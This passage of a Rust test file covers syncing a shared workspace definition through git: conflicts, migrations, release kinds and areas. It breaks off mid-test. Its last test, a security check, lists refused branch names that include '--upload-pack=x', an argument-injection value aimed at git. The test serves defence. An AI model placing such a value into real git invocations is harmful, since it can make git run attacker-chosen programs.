    // Challenger 2.2: the queued edit still shows, with the areas after it.
    let doctor = crate::doctor::shared_definition_status("atelier", &other.cache().unwrap(), &other.queue(), &[]).unwrap();
    assert_eq!((doctor.state, doctor.summary.as_str()), ("held", "Pending sync"));
    assert!(doctor.detail.contains("queued for") && doctor.detail.contains("No card can start"), "{}", doctor.detail);
    publish_pending(&other.stores(), &repo, &publisher, &other.ws_id).unwrap();
    let on_branch: Value = serde_json::from_slice(&repo.read("main", DEFINITION_PATH).unwrap().bytes).unwrap();
    assert_eq!(on_branch["name"], "Renamed");
    assert_eq!(on_branch["areas"], serde_json::from_str::<Value>(overlap).unwrap(), "untouched");

    // The editor refuses a broken list…
    let base = to_map(&get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap());
    let mut draft = base.clone();
    draft["areas"][1]["path"] = Value::from("");
    let err = save_changes(&fx.stores(), &repo, &fx.ws_id, base.clone(), draft).unwrap_err();
    assert!(err.contains("both take the whole repository"), "{err}");
    assert!(fx.cache().unwrap().pending.is_empty(), "nothing recorded");
    // …and takes a valid replacement, which publishes and clears the problem.
    let mut fixed = base.clone();
    fixed["areas"][1]["targetBranch"] = Value::from("release");
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, fixed).unwrap();
    assert!(fx.queue().fields.contains_key("areas"));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let on_branch = parse_definition(&repo.read("main", DEFINITION_PATH).unwrap().bytes).unwrap();
    assert_eq!(on_branch.areas.unwrap().valid().unwrap()[1].target_branch.as_deref(), Some("release"));
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().field_problems.is_empty());
    other.refresh(&repo);
    assert!(!crate::areas::view(&other.configs, &other.ws_id, "").held);
    assert_eq!(crate::areas::load(&other.configs, &other.ws_id).len(), 2);
}

/// Challenger 1: who changed the areas is found through a broken revision
/// too — it is a value like any other.
#[test]
fn b1_provenance_reads_through_a_broken_list() {
    let dir = tempfile::tempdir().unwrap();
    let run = |args: &[&str], name: &str| {
        let out = crate::platform::git_command()
            .args(args)
            .current_dir(dir.path())
            .env("GIT_AUTHOR_NAME", name)
            .env("GIT_AUTHOR_EMAIL", "a@example.com")
            .env("GIT_COMMITTER_NAME", name)
            .env("GIT_COMMITTER_EMAIL", "a@example.com")
            .output()
            .unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    };
    run(&["init", "-q", "-b", "main"], "x");
    std::fs::create_dir_all(dir.path().join(".atelier")).unwrap();
    std::fs::write(dir.path().join(DEFINITION_PATH), PLY_DEFINITION).unwrap();
    run(&["add", "."], "x");
    run(&["commit", "-q", "-m", "one"], "alice");
    let broken = with_areas(r#"[{ "id": "all", "path": "web" }]"#);
    std::fs::write(dir.path().join(DEFINITION_PATH), broken).unwrap();
    run(&["commit", "-q", "-am", "two"], "bob");
    let repo = GitRepo { cwd: dir.path().to_path_buf() };
    let provenance = repo.field_provenance("main", "main");
    assert_eq!(provenance["areas"].author, "bob");
    assert_eq!(provenance["name"].author, "alice", "the broken revision isn't read as empty");
}

/// Tier 2 (v1.11.x template): a 1.172-shaped cache — pending edits, write
/// access, a shared setup found elsewhere — loads without field problems and
/// re-saves with every field it had and no `fieldProblems` key; one with a
/// problem round-trips.
#[test]
fn b1_a_cache_from_1172_loads_and_resaves_without_field_problems() {
    let fx = Fixture::new();
    let path = cache_path(&fx.configs, &fx.ws_id);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let before = r##"{
  "schemaVersion": 1,
  "definition": { "schemaVersion": 1, "name": "Ply", "board": "local" },
  "source": "repo",
  "branch": "main",
  "commit": "c1",
  "author": "test-owner",
  "changedAt": 1700000000,
  "refreshedAt": 5,
  "unreadable": null,
  "pending": { "name": "Mine" },
  "pendingState": "pendingSync",
  "writeAccess": { "canPush": true, "checkedAt": 7, "pushRefused": null },
  "foundElsewhere": { "branch": "walk", "name": "Walk", "here": "main", "answer": null, "others": ["rel"] }
}"##;
    std::fs::write(&path, before).unwrap();
    let cache = fx.cache().unwrap();
    assert!(cache.field_problems.is_empty());
    assert_eq!(cache.pending["name"], "Mine");
    assert_eq!(cache.write_access.can_push, Some(true));
    assert_eq!(cache.found_elsewhere.as_ref().unwrap().others, vec!["rel".to_string()]);
    save_cache(&fx.configs, &fx.ws_id, &cache).unwrap();
    let resaved = std::fs::read_to_string(&path).unwrap();
    assert!(!resaved.contains("fieldProblems"), "{resaved}");
    let a: Value = serde_json::from_str(before).unwrap();
    let mut b: Value = serde_json::from_str(&resaved).unwrap();
    // `schemaVersion` of the cache and the definition's own are written as they were.
    b.as_object_mut().unwrap().retain(|k, _| a.get(k).is_some());
    assert_eq!(a, b, "every 1.172 field survives the re-save");

    let mut with = cache.clone();
    with.field_problems.insert(
        "areas".into(),
        FieldProblem { message: "Two areas are called “site”.".into(), kept: serde_json::json!([{ "id": "site", "path": "web" }]) },
    );
    save_cache(&fx.configs, &fx.ws_id, &with).unwrap();
    let text = std::fs::read_to_string(&path).unwrap();
    assert!(text.contains("\"fieldProblems\""), "{text}");
    assert_eq!(fx.cache().unwrap(), with);
}

/// Challenger 2.4: a reader that finds broken areas with no kept entry (a
/// cache written before the refresh recorded one) falls back to this Mac's
/// own copy, never to "no areas".
#[test]
fn b1_without_a_kept_entry_the_view_keeps_this_mac_s_areas() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &with_areas(TWO_AREAS), "a", "c1");
    fx.refresh(&repo);
    let mut cache = fx.cache().unwrap();
    let broken = parse_definition(with_areas(r#"[{ "id": "all", "path": "x" }]"#).as_bytes()).unwrap();
    cache.definition = Some(broken);
    assert!(cache.field_problems.is_empty());
    save_cache(&fx.configs, &fx.ws_id, &cache).unwrap();
    let effective = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    assert_eq!(effective.areas.unwrap().valid().unwrap().len(), 2);
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.queue().is_empty(), "this Mac's copy isn't an edit to publish");
}

// ── 1.173.0 (C3): a shared setting both sides changed ─────────────────

fn held_by(theirs: Value) -> crate::shared_config::FieldConflict {
    crate::shared_config::FieldConflict {
        theirs,
        author: Some("test-owner".into()),
        device: Some("MacBook Pro".into()),
        same_person: true,
        changed_at: Some(1_700_000_000),
        tip: Some("c2".into()),
        this_computer: false,
        merged: None,
    }
}

/// The question as the sheet showed it.
fn shown_as(theirs: Value) -> ShownConflict {
    ShownConflict { theirs, changed_at: Some(1_700_000_000) }
}

/// This Mac edits the verify pipeline; the branch has someone else's value
/// by the time it publishes, and the name goes with it.
fn c3_conflict(fx: &Fixture, repo: &FakeRepo) -> PublishReport {
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(repo);
    set_pipeline(fx, "scripts/mine.sh");
    fx.workspaces.rename(&fx.ws_id, "Ply 2".into()).unwrap();
    record_local_edit(&fx.stores(), repo, &fx.ws_id, false).unwrap();
    let theirs_text = PLY_DEFINITION.replace("scripts/ppvp.sh", "scripts/theirs.sh");
    repo.put("main", DEFINITION_PATH, &theirs_text, "test-owner", "c2");
    let published = parse_definition(theirs_text.replace("\"Ply\"", "\"Ply 2\"").as_bytes()).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::Published {
        commit: "pushed1".into(),
        definition: published,
        author: Some("me".into()),
        fields: vec!["name".into()],
        overrides: Vec::new(),
        pushed: true,
        conflicts: BTreeMap::from([("verifyPipeline".to_string(), held_by(pipeline("scripts/theirs.sh")))]),
    });
    publish_pending(&fx.stores(), repo, &publisher, &fx.ws_id).unwrap().unwrap()
}

#[test]
fn c3_a_held_field_stays_queued_and_survives_refreshes_while_the_others_publish() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let report = c3_conflict(&fx, &repo);
    assert_eq!(report.published, vec!["name".to_string()], "every other field goes");
    assert_eq!(report.conflicts, vec!["verifyPipeline".to_string()]);
    let queue = fx.queue();
    assert!(!queue.fields.contains_key("name"));
    let held = &queue.fields["verifyPipeline"];
    assert_eq!(held.value, pipeline("scripts/mine.sh"));
    assert_eq!(held.conflict.as_ref().unwrap().theirs, pipeline("scripts/theirs.sh"));

    // Refreshes keep this Mac's value and the question while it is open.
    for _ in 0..2 {
        let report = fx.refresh(&repo);
        assert!(report.changes.iter().all(|c| c.field != "verifyPipeline"), "never replaced silently");
        assert_eq!(report.pending_fields, vec!["verifyPipeline".to_string()]);
    }
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }])
    );
    assert!(fx.queue().fields["verifyPipeline"].conflict.is_some());

    // The view carries the question with only the difference.
    let view = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap();
    assert_eq!(view.conflicts.len(), 1);
    let c = &view.conflicts[0];
    assert_eq!((c.field.as_str(), c.label.as_str()), ("verifyPipeline", "Checks before shipping"));
    assert_eq!(c.device.as_deref(), Some("MacBook Pro"));
    assert!(c.same_person);
    assert_eq!(c.difference.only_mine, vec!["scripts/mine.sh"]);
    assert_eq!(c.difference.only_theirs, vec!["scripts/theirs.sh"]);

    // An edit of another field keeps the question; a new value of this one
    // asks it again at the next publish.
    fx.workspaces.rename(&fx.ws_id, "Ply 3".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.queue().fields["verifyPipeline"].conflict.is_some());
    set_pipeline(&fx, "scripts/mine2.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.queue().fields["verifyPipeline"].conflict.is_none());
}

#[test]
fn c3_use_this_macs_publishes_over_the_value_shown() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    c3_conflict(&fx, &repo);
    assert!(resolve_conflict(&fx.stores(), &fx.ws_id, "verifyPipeline", ConflictChoice::Mine, &shown_as(pipeline("scripts/theirs.sh"))).unwrap());
    let entry = &fx.queue().fields["verifyPipeline"];
    assert!(entry.conflict.is_none());
    assert_eq!(entry.use_mine.as_ref().unwrap().over, pipeline("scripts/theirs.sh"));
    // Answered: a second answer has nothing to do.
    assert!(!resolve_conflict(&fx.stores(), &fx.ws_id, "verifyPipeline", ConflictChoice::Theirs, &shown_as(pipeline("scripts/theirs.sh"))).unwrap());

    let publisher = FakePublisher::default();
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let (_, sent, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(sent["verifyPipeline"].use_mine.as_ref().unwrap().over, pipeline("scripts/theirs.sh"));
    assert_eq!(report.published, vec!["verifyPipeline".to_string()]);
    assert!(fx.queue().is_empty());
}

#[test]
fn c3_keep_theirs_drops_this_macs_edit_and_applies_the_repositorys() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    c3_conflict(&fx, &repo);
    assert!(resolve_conflict(&fx.stores(), &fx.ws_id, "verifyPipeline", ConflictChoice::Theirs, &shown_as(pipeline("scripts/theirs.sh"))).unwrap());
    assert!(!fx.queue().fields.contains_key("verifyPipeline"));
    assert!(!fx.cache().unwrap().pending.contains_key("verifyPipeline"));
    fx.refresh(&repo);
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/theirs.sh".into() }])
    );
    assert!(fx.queue().fields.get("verifyPipeline").is_none(), "nothing left to publish");
    assert!(get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().conflicts.is_empty());
}

/// 1.173.0 (C3): queues written before carry no question and no choice;
/// a queue without either writes neither key.
#[test]
fn c3_schema_migration_older_queues_load_without_conflicts() {
    let old = r#"{"schemaVersion":1,"fields":{"name":{"value":"Ply 2","base":"Ply","baseCommit":"c1","queuedAt":5,"attempts":1,"lastError":null,"pullRequest":null}},"lastError":null}"#;
    let queue: PublishQueue = serde_json::from_str(old).unwrap();
    let entry = &queue.fields["name"];
    assert!(entry.conflict.is_none() && entry.use_mine.is_none());
    assert_eq!(entry.attempts, 1);
    let text = serde_json::to_string(&queue).unwrap();
    assert!(!text.contains("conflict") && !text.contains("useMine") && !text.contains("proposed"), "{text}");
    assert!(entry.proposed.is_empty());
    // A question written by round 0 (no thisComputer, no merged) loads.
    let older: crate::shared_config::FieldConflict =
        serde_json::from_str(r#"{"theirs":1,"author":"a","device":null,"samePerson":true,"changedAt":5,"tip":"c"}"#).unwrap();
    assert!(!older.this_computer && older.merged.is_none());
    // A report from before has no conflicts list.
    let report: PublishReport = serde_json::from_str(
        r#"{"branch":"main","published":[],"commit":null,"overrides":[],"pullRequest":null,"pullRequestFields":[],"closedPullRequests":[],"withdrawnPullRequests":[],"error":null,"offline":false}"#,
    )
    .unwrap();
    assert!(report.conflicts.is_empty());
    // A question survives its round trip, `null` theirs (removed) included.
    let mut queue = queue;
    queue.fields.get_mut("name").unwrap().conflict = Some(held_by(Value::Null));
    queue.fields.get_mut("name").unwrap().use_mine = Some(crate::shared_config::UseMine { over: Value::Null });
    queue.fields.get_mut("name").unwrap().proposed = vec![
        crate::shared_config::Proposed { value: Value::Null, pull_request: 1 },
        crate::shared_config::Proposed { value: Value::from("Ply 3"), pull_request: 2 },
    ];
    let back: PublishQueue = serde_json::from_str(&serde_json::to_string(&queue).unwrap()).unwrap();
    assert_eq!(back, queue);
}

#[test]
fn c3r1_an_answer_to_an_older_question_records_nothing() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    c3_conflict(&fx, &repo);
    // The branch moved on after the sheet showed theirs: a later drain
    // replaced the question.
    let mut queue = fx.queue();
    let mut newer = held_by(pipeline("scripts/again.sh"));
    newer.changed_at = Some(1_700_000_900);
    queue.fields.get_mut("verifyPipeline").unwrap().conflict = Some(newer.clone());
    crate::shared_config::save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();

    for choice in [ConflictChoice::Mine, ConflictChoice::Theirs] {
        let answered = resolve_conflict(
            &fx.stores(),
            &fx.ws_id,
            "verifyPipeline",
            choice,
            &shown_as(pipeline("scripts/theirs.sh")),
        )
        .unwrap();
        assert!(!answered, "{choice:?} to the old question");
    }
    let entry = &fx.queue().fields["verifyPipeline"];
    assert_eq!(entry.conflict.as_ref(), Some(&newer), "the new question still stands");
    assert!(entry.use_mine.is_none());
    assert!(fx.cache().unwrap().pending.contains_key("verifyPipeline"));
    // The view now shows the new question to answer.
    let view = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap();
    assert_eq!(view.conflicts[0].theirs, pipeline("scripts/again.sh"));
}

#[test]
fn c3r1_a_pull_request_remembers_the_value_it_proposed() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/pr.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        pull_request: PullRequest { number: 7, url: "https://github.com/o/r/pull/7".into(), branch: "b".into(), head: None },
        fields: vec!["verifyPipeline".into()],
        conflicts: Default::default(),
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    // Edited again while it waits: the pull request is superseded, the value
    // it proposed is remembered.
    set_pipeline(&fx, "scripts/mine.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let entry = &fx.queue().fields["verifyPipeline"];
    assert!(entry.pull_request.is_none());
    assert_eq!(
        entry.proposed,
        vec![crate::shared_config::Proposed { value: pipeline("scripts/pr.sh"), pull_request: 7 }]
    );
    assert_eq!(entry.base_against(&pipeline("scripts/pr.sh")), pipeline("scripts/pr.sh"));
    assert_eq!(entry.base_against(&pipeline("scripts/x.sh")), pipeline("scripts/ppvp.sh"));

    // C3 round 2: the pull request closes unmerged — its value is forgotten,
    // so that value on the branch is someone else's again.
    publisher.pr_states.borrow_mut().insert(7, PrState::Closed);
    // The edit itself doesn't land this time: it stays queued.
    publisher.outcomes.borrow_mut().push(PublishOutcome::Unreachable("offline".into()));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let entry = &fx.queue().fields["verifyPipeline"];
    assert!(entry.proposed.is_empty(), "{:?}", entry.proposed);
    assert_eq!(entry.base_against(&pipeline("scripts/pr.sh")), pipeline("scripts/ppvp.sh"));
}

#[test]
fn c3r1_keep_theirs_of_models_keeps_the_keys_they_left_alone() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let theirs = serde_json::json!({ "claude": { "build": "sonnet" } });
    let mine = serde_json::json!({ "claude": { "build": "haiku", "review": "opus" } });
    let mut cache = fx.cache().unwrap();
    cache.pending.insert("models".into(), mine.clone());
    save_cache(&fx.configs, &fx.ws_id, &cache).unwrap();
    let mut queue = PublishQueue::default();
    let mut conflict = held_by(theirs.clone());
    conflict.merged = Some(crate::shared_config::UseMine { over: mine.clone() });
    queue.fields.insert(
        "models".into(),
        QueuedField {
            value: mine,
            base: serde_json::json!({ "claude": { "build": "opus" } }),
            base_commit: None,
            queued_at: 0,
            attempts: 0,
            last_error: None,
            pull_request: None,
            conflict: Some(conflict),
            use_mine: None,
            proposed: Vec::new(),
        },
    );
    crate::shared_config::save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    assert!(resolve_conflict(&fx.stores(), &fx.ws_id, "models", ConflictChoice::Theirs, &shown_as(theirs.clone())).unwrap());
    let entry = &fx.queue().fields["models"];
    assert_eq!(entry.value, serde_json::json!({ "claude": { "build": "sonnet", "review": "opus" } }));
    assert_eq!(entry.base, theirs, "measured against theirs now: no new question");
    assert!(entry.conflict.is_none());
    assert_eq!(fx.cache().unwrap().pending["models"], entry.value);
}

#[test]
fn c3r1_the_doctor_says_a_held_field_waits_for_a_choice() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    c3_conflict(&fx, &repo);
    let row = crate::doctor::shared_definition_status("Ply", &fx.cache().unwrap(), &fx.queue(), &[]).unwrap();
    assert_eq!(row.state, "pending");
    assert_eq!(row.summary, "Waiting for your choice: Checks before shipping");
    assert!(row.detail.contains("until you choose"), "{}", row.detail);
}

// ── 1.173.0 (G1): the default release kind ────────────────────────────

/// Tier 2 (v1.11.x template): every definition written before G1 loads
/// without `releaseKind`, writes none and changes nothing on this Mac; an
/// older Plyloft keeps it as an unknown key; a kind this build doesn't know
/// reads as unset and the file stays readable.
#[test]
fn g1_a_definition_from_before_the_release_kind_loads_and_changes_nothing() {
    let def = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert_eq!(def.release_kind, None);
    let text = serde_json::to_string(&def).unwrap();
    assert!(!text.contains("releaseKind"), "not written when absent: {text}");
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "someone", "c1");
    let report = fx.refresh(&repo);
    assert!(!report.changes.iter().any(|c| c.field == "releaseKind"), "{:?}", report.changes);
    assert_eq!(crate::areas::load_release_kind(&fx.configs, &fx.ws_id), None);

    let later = PLY_DEFINITION.replace("\"installScript\"", "\"releaseKind\": \"deploy\",\n  \"installScript\"");
    assert_eq!(
        parse_definition(later.as_bytes()).expect("still readable").release_kind.as_deref(),
        Some("deploy"),
        "a later kind is kept as written"
    );
    let wrong = PLY_DEFINITION.replace("\"installScript\"", "\"releaseKind\": 3,\n  \"installScript\"");
    assert_eq!(parse_definition(wrong.as_bytes()).expect("still readable").release_kind, None);
    #[derive(serde::Deserialize)]
    struct Older {
        #[serde(flatten)]
        extra: BTreeMap<String, Value>,
    }
    let with = PLY_DEFINITION.replace("\"installScript\"", "\"releaseKind\": \"push_only\",\n  \"installScript\"");
    let older: Older = serde_json::from_str(&with).unwrap();
    assert_eq!(older.extra["releaseKind"], "push_only");
}

/// The repository's default reaches this Mac's `areas.json` on a refresh,
/// named "Default release"; Settings › Shipping's edit is applied here at
/// once and queued for the branch like any shared field.
#[test]
fn g1_the_default_release_kind_travels_with_the_definition() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let with = |kind: &str| PLY_DEFINITION.replace("\"installScript\"", &format!("\"releaseKind\": \"{kind}\",\n  \"installScript\""));
    repo.put("main", DEFINITION_PATH, &with("push_only"), "matteo", "c1");
    let report = fx.refresh(&repo);
    let change = report.changes.iter().find(|c| c.field == "releaseKind").expect("a change of releaseKind");
    assert_eq!(change.label, "Default release");
    assert_eq!(crate::areas::load_release_kind(&fx.configs, &fx.ws_id), Some("push_only".to_string()));
    assert!(fx.refresh(&repo).changes.iter().all(|c| c.field != "releaseKind"), "nothing new: no change");

    let base = to_map(&get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap());
    assert_eq!(base["releaseKind"], "push_only");
    let mut draft = base.clone();
    draft.insert("releaseKind".into(), Value::from("github"));
    let view = save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    assert!(view.cache.pending.contains_key("releaseKind"), "{:?}", view.cache.pending);
    assert_eq!(crate::areas::load_release_kind(&fx.configs, &fx.ws_id), Some("github".to_string()));
    assert_eq!(fx.queue().fields["releaseKind"].value, "github");
}

/// G1 Challenger 2: a kind a newer Plyloft wrote — at the top level and on
/// an area — survives a publish of another field from this build.
#[test]
fn g1_a_later_release_kind_survives_a_publish_of_another_field() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let text = PLY_DEFINITION.replace(
        "\"installScript\"",
        "\"releaseKind\": \"deploy_preview\",\n  \"areas\": [{ \"id\": \"site\", \"name\": \"Site\", \"path\": \"web\", \"releaseKind\": \"canary\" }],\n  \"installScript\"",
    );
    repo.put("main", DEFINITION_PATH, &text, "matteo", "c1");
    fx.refresh(&repo);
    let base = to_map(&get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap());
    let mut draft = base.clone();
    draft.insert("name".into(), Value::from("Renamed"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let cache = fx.cache().unwrap();
    let fields: BTreeMap<String, Value> =
        fx.queue().fields.iter().map(|(k, f)| (k.clone(), f.value.clone())).collect();
    assert!(fields.contains_key("name"), "{fields:?}");
    let written = file_text(cache.definition.as_ref().unwrap(), None, &fields, "main");
    let def = parse_definition(written.as_bytes()).unwrap();
    assert_eq!(def.name, "Renamed");
    assert_eq!(def.release_kind.as_deref(), Some("deploy_preview"), "{written}");
    let areas = def.areas.unwrap();
    assert_eq!(areas.valid().unwrap()[0].release_kind.as_deref(), Some("canary"), "{written}");
}

// ── 1.174.0 (C10, D6): areas kept on this Mac until the setup is shared ──

fn c10_areas(json: &str) -> Vec<crate::areas::AreaDef> {
    serde_json::from_str(json).unwrap()
}

/// A legacy file's conversion carries the areas kept here, so its one
/// `chore(config)` commit of `.atelier/workspace.json` shares them; after it
/// they are the repository's.
#[test]
fn c10_a_converted_legacy_definition_carries_the_areas_kept_here() {
    let fx = Fixture::new();
    fx.configs.set(&fx.ws_id, crate::project_config::default_atelier_config()).unwrap();
    crate::areas::save_local(&fx.configs, &fx.ws_id, &c10_areas(TWO_AREAS)).unwrap();
    assert_eq!(crate::areas::for_workspace(&fx.configs, &fx.ws_id).len(), 2, "decides before the share");
    let repo = FakeRepo::new();
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Legacy);
    assert!(crate::areas::kept_here(&fx.configs, &fx.ws_id).is_none(), "the repository's now");
    assert!(crate::areas::set_aside(&fx.configs, &fx.ws_id).is_none(), "the same list: nothing set aside");
    fx.refresh(&repo);
    assert_eq!(crate::areas::for_workspace(&fx.configs, &fx.ws_id).len(), 2, "a second read of the legacy file keeps them");
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let requests = publisher.requests.borrow();
    assert_eq!(requests.len(), 1, "one publish");
    let def = requests[0].2.clone().expect("the converted definition");
    let ids: Vec<String> = def.areas.unwrap().valid().unwrap().iter().map(|a| a.id.clone()).collect();
    assert_eq!(ids, ["app", "site"]);
    assert_eq!(crate::areas::for_workspace(&fx.configs, &fx.ws_id).len(), 2);
}

/// Another computer shared the setup with other areas: this Mac's are set
/// aside, the repository's apply, and nothing goes to the repository —
/// "Use the repository's" writes nothing; "Publish mine" is one edit of
/// the shared field.
#[test]
fn c10_a_setup_shared_with_other_areas_sets_this_macs_aside_and_writes_nothing() {
    let fx = Fixture::new();
    let mine = c10_areas(r#"[{ "id": "app", "name": "App", "path": "/" }, { "id": "web", "name": "Web", "path": "web/" }]"#);
    crate::areas::save_local(&fx.configs, &fx.ws_id, &mine).unwrap();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &with_areas(TWO_AREAS), "ana", "c1");
    fx.refresh(&repo);
    let ids = |list: Vec<crate::areas::AreaDef>| list.into_iter().map(|a| a.id).collect::<Vec<_>>();
    assert_eq!(ids(crate::areas::for_workspace(&fx.configs, &fx.ws_id)), ["app", "site"], "the repository's");
    let aside = crate::areas::set_aside(&fx.configs, &fx.ws_id).expect("this Mac's set aside");
    assert_eq!(ids(aside.areas.clone()), ["app", "web"]);
    assert!(fx.queue().is_empty() && fx.cache().unwrap().pending.is_empty(), "nothing to publish");

    // Use the repository's: nothing written there; asked no more.
    assert!(!answer_set_aside(&fx.stores(), &repo, &fx.ws_id, false).unwrap());
    assert!(crate::areas::set_aside(&fx.configs, &fx.ws_id).is_none());
    assert!(fx.queue().is_empty() && fx.cache().unwrap().pending.is_empty(), "still nothing to publish");
    assert!(fx.configs.workspace_dir(&fx.ws_id).join(&aside.file).exists(), "set aside, not deleted");
    fx.refresh(&repo);
    assert!(crate::areas::set_aside(&fx.configs, &fx.ws_id).is_none(), "a later read doesn't ask again");
}

#[test]
fn c10_publish_mine_is_one_edit_of_the_shared_areas() {
    let fx = Fixture::new();
    let mine = c10_areas(r#"[{ "id": "app", "name": "App", "path": "/" }, { "id": "web", "name": "Web", "path": "web/" }]"#);
    crate::areas::save_local(&fx.configs, &fx.ws_id, &mine).unwrap();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &with_areas(TWO_AREAS), "ana", "c1");
    fx.refresh(&repo);
    assert!(answer_set_aside(&fx.stores(), &repo, &fx.ws_id, true).unwrap());
    assert!(crate::areas::set_aside(&fx.configs, &fx.ws_id).is_none());
    let queue = fx.queue();
    assert_eq!(queue.fields.keys().collect::<Vec<_>>(), ["areas"], "only the areas");
    assert_eq!(queue.fields["areas"].value[1]["id"], "web");
    let ids: Vec<String> = crate::areas::for_workspace(&fx.configs, &fx.ws_id).into_iter().map(|a| a.id).collect();
    assert_eq!(ids, ["app", "web"], "this Mac runs with them while they're on their way");
}

/// A repository shared without areas: this Mac's are set aside too (no
/// refresh publishes on its own); the sheet asks.
#[test]
fn c10_a_setup_shared_without_areas_publishes_nothing_by_itself() {
    let fx = Fixture::new();
    crate::areas::save_local(&fx.configs, &fx.ws_id, &c10_areas(TWO_AREAS)).unwrap();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    fx.refresh(&repo);
    assert!(crate::areas::for_workspace(&fx.configs, &fx.ws_id).is_empty(), "the repository's: none");
    assert!(crate::areas::set_aside(&fx.configs, &fx.ws_id).is_some());
    assert!(fx.queue().is_empty() && fx.cache().unwrap().pending.is_empty());
}

/// Areas round 1: a repository with no `origin` still offers this
/// computer's own branches for an area's Cards go to.
#[test]
fn branch_choices_name_this_computer_s_branches_without_an_origin() {
    let dir = TempDir::new().unwrap();
    let git = |args: &[&str]| {
        let out = crate::platform::git_command().args(args).current_dir(dir.path()).output().unwrap();
        assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    };
    git(&["init", "-q", "-b", "main"]);
    git(&["-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "one"]);
    git(&["branch", "staging"]);
    let repo = GitRepo { cwd: dir.path().to_path_buf() };
    let choices = branch_choices(&repo, None);
    assert!(!choices.has_origin);
    assert!(choices.branches.is_empty(), "no origin: none of its branches");
    let mut local = choices.local_branches.clone();
    local.sort();
    assert_eq!(local, ["main", "staging"]);
    // An older answer without the field still reads.
    let older: BranchChoices =
        serde_json::from_str(r#"{"branches":[],"defaultBranch":"main","error":null,"hasOrigin":false}"#).unwrap();
    assert!(older.local_branches.is_empty());
}

// ── 1.175.0, A8 ───────────────────────────────────────────────────────

/// SEC-10: an `integrationBranch` git itself would refuse makes the file
/// unusable like any bad value (the last good copy stays in use), instead of
/// being handed to every fetch and push. A real branch name reads as before.
#[test]
fn an_integration_branch_git_refuses_makes_the_definition_unusable() {
    let with = |branch: &str| {
        let text = serde_json::json!({ "schemaVersion": 1, "name": "LYRA", "integrationBranch": branch }).to_string();
        parse_definition(text.as_bytes())
    };
    for good in ["main", "staging", "release/1.x", "feature/a-b_c", "user@work", ""] {
        let def = with(good).unwrap_or_else(|bad| panic!("{good:?}: {}", bad.message));
        assert_eq!(def.integration_branch.as_deref(), Some(good));
    }
    for bad in ["-x", "--upload-pack=x", "a..b", "staging ", "a b", "refs/heads/x.lock", "x~1", "x^", "a:b", "@", "x/", "/x", ".hidden", "a\\b", "x@{1}", "wild*"] {
        let refused = with(bad).expect_err(bad);
        assert_eq!(refused.path, DEFINITION_PATH, "{bad:?}");
        assert_eq!(refused.line, None, "{bad:?}");
        assert_eq!(
            refused.message,
